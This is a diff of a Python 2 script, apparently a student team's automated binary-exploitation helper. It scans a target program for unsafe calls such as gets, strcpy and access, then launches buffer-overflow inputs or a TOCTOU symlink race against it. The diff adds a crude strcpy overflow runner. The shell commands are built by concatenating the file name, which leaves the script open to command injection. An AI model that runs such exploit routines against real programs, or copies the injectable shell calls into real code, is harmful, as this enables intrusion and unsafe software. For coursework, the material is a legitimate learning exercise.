@@ -23,19 +23,6 @@ def toctou_attempt():
     os.system(alias_create_link)
 
 
-def print_summary():
-    print "File summary:"
-    print os.popen("file " + inputFile).read()
-
-    print os.popen("readelf -h " + inputFile).read()
-
-    print "Calls in main:"
-    print os.popen("objdump -D " + inputFile + " | sed '/<main>:/,/^$/!d' | grep --color='auto' -n call").read()
-
-    print "Interesting strings:"
-    print os.popen("strings " + inputFile + "| grep --color='auto' -n -v '\.\|_\|;' ").read()
-
-
 def inject_gets(buffers):
     for buf in buffers:
         buf = int(buf, 16)
@@ -76,8 +63,8 @@ def scanf_exploit(buf_size):
 
 
 def strcpy_exploit(buf_size):
-    # Still need to implement
-    result = 1
+    exploit = "1" * buf_size
+    result = os.system("echo " + exploit + " > exploit.txt && ./" + inputFile)
     if result != 0:
         print "Success"
     else:
@@ -102,12 +89,15 @@ if test_path.parent != Path(basedir).resolve():
 
 # added access function
 vulnerabilities = filter(None, os.popen(
-    'objdump -M Intel -d ' + inputFile + ' | grep -oP "(gets|scanf|strcpy|memcpy|printf|system|fgets|gets|execl|access|execve)"').read().split(
+    'objdump -M Intel -d ' + inputFile + ' | grep -oP "(gets|scanf|strcpy|memcpy|printf|system|fgets|gets|execl|access)"').read().split(
     '\n'))
 vulnerabilities = list(set(filter(None, vulnerabilities)))
 
 print "Team 7 below is the list of suspected vulnerabilities to look at:\n" + str(vulnerabilities)
 
+# buffers = filter(None,os.popen('objdump -d ' +inputFile+ ' | grep -oP "(?<=buf    .)....(?=,%esp)"').read()).split('\n')
+# buffers.sort()
+# buffers = list(set(filter(None, buf)))
 buffers = os.popen('objdump -d ' + inputFile + ' | grep -P "^<*(?=.*(>:))"').read()
 buffers = buffers.split("\n")
 buffers = list(filter(lambda x: not "@" in x, buffers))
@@ -119,17 +109,20 @@ for suspect_func in vulnerabilities:
 
     if suspect_func == "gets":
         inject_gets(buffers)
+        break
     elif suspect_func == "scanf":
         inject_scanf(buffers)
+        break
     elif suspect_func == "strcpy":
         inject_scanf(buffers)
+        break
     elif suspect_func == "execl":
         inject_execl()
+        break
     elif suspect_func == "access":
         set_up_toctou_attempt()
+        break
     else:
-        print "\nNo known vulnerability found"
+        print "No known vulnerability found"
 
-    if raw_input('Print summary (y/n):') == 'y':
-        print_summary()
-    exit()
+    print os.popen("gdb -batch -ex " + inputFile + " -ex 'disassemble main' | grep -n call").read()
